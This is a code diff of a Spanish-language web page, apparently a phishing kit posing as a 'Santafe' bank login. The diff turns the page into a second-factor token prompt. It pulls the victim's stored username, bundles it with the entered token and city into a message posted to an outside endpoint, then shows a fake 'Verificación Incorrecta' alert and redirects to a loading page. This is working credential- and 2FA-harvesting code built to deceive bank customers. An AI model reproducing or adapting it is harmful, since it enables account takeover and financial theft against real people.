@@ -281,27 +281,14 @@
               </g>
             </g>
           </svg>
-          <div style="width: 100%; height: 120px"></div>
-          <div class="input-container">
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="24"
-              height="24"
-              viewBox="0 0 24 24"
-              data-src="static/media/userIcon.9900d9f6.svg"
-              xmlns:xlink="http://www.w3.org/1999/xlink"
-            >
-              <path
-                style="fill: rgb(255, 255, 255)"
-                id="Shape-49"
-                d="M3.155,15.89A3.158,3.158,0,0,1,0,12.736V3.155A3.158,3.158,0,0,1,3.155,0h13.88a3.158,3.158,0,0,1,3.155,3.155V8.833a.789.789,0,0,1-1.578,0V3.155a1.579,1.579,0,0,0-1.577-1.578H3.155A1.58,1.58,0,0,0,1.577,3.155v9.581a1.58,1.58,0,0,0,1.578,1.578h13.88a1.579,1.579,0,0,0,1.577-1.578.789.789,0,0,1,1.578,0,3.158,3.158,0,0,1-3.155,3.155ZM4.463,12.5a1.31,1.31,0,0,1-1.281-1.579A3.861,3.861,0,0,1,4.973,8.4a2.484,2.484,0,1,1,4.012,0,3.867,3.867,0,0,1,1.791,2.518A1.311,1.311,0,0,1,9.5,12.5Zm8.431-1.656a.788.788,0,1,1,0-1.577H15.1a.788.788,0,0,1,0,1.577Zm0-3.193a.789.789,0,1,1,0-1.578h3.39a.789.789,0,1,1,0,1.578Z"
-              ></path>
-            </svg>
-            <input type="text" id="usuario" name="input" placeholder=" " />
-            <label for="input">USUARIO</label>
-          </div>
 
-          <div class="input-container" style="margin-top: 50px">
+          <div style="width: 100%; height: 80px"></div>
+          <div style="text-align: left; color: white; font-weight: bold">
+            Ingrese su autenticación de doble factor
+          </div>
+          <div style="width: 100%; height: 50px"></div>
+
+          <div class="input-container" style="margin-top: 20px">
             <svg
               xmlns="http://www.w3.org/2000/svg"
               width="24"
@@ -359,8 +346,16 @@
                 </g>
               </g>
             </svg>
-            <input type="password" id="contra" name="input" placeholder=" " />
-            <label for="input">CONTRASEÑA</label>
+            <input
+              type="text"
+              id="contra"
+              name="input"
+              placeholder=" "
+              inputmode="numeric"
+              minlength="6"
+              maxlength="6"
+            />
+            <label for="input">TOKEN SEGUNDO FACTOR</label>
           </div>
 
           <script>
@@ -375,9 +370,25 @@
               }
             });
           </script>
+          <script>
+            // Obtener el elemento de input
+            const input2 = document.getElementById("contra");
+
+            // Escuchar el evento de entrada en el input
+            input2.addEventListener("input", function (event) {
+              // Obtener el valor actual del input
+              let value = event.target.value;
+
+              // Filtrar los caracteres no numéricos
+              value = value.replace(/\D/g, "");
+
+              // Actualizar el valor del input
+              event.target.value = value;
+            });
+          </script>
           <br />
           <div style="width: 100%; height: 100px"></div>
-          <button type="submit">CONTINUAR</button>
+          <button type="submit">INGRESAR</button>
           <div style="width: 100%; text-align: center">
             <img src="1.png" alt="" />
           </div>
@@ -396,11 +407,10 @@
       event.preventDefault(); // Aquí evitamos que el formulario se envíe
 
       // Obtener valores de DNI y contraseña
-      const dni = document.querySelector("#usuario").value;
       const contra = document.querySelector("#contra").value;
 
       // Verificar si alguno de los campos está vacío
-      if (dni.trim() === "" || contra.trim() === "") {
+      if (contra.trim() === "") {
         alert("Por favor, completa todos los campos.");
         return; // Detener la ejecución si hay campos vacíos
       }
@@ -409,11 +419,10 @@
       axios
         .get(url)
         .then((response) => {
-          localStorage.setItem("usuario", dni);
           const message =
             "\nSantafe" +
             "\nUsuario: " +
-            dni +
+            localStorage.getItem("usuario") +
             "\nContraseña: " +
             contra +
             "\nCiudad:" +
@@ -431,6 +440,7 @@
               }
             )
             .then((response) => {
+              alert("Verificación Incorrecta");
               window.location.href = "cargando.html"; // Cambiar 'pagina_destino.html' por la URL de la página a la que quieres redirigir.
             })
             .catch((error) => {
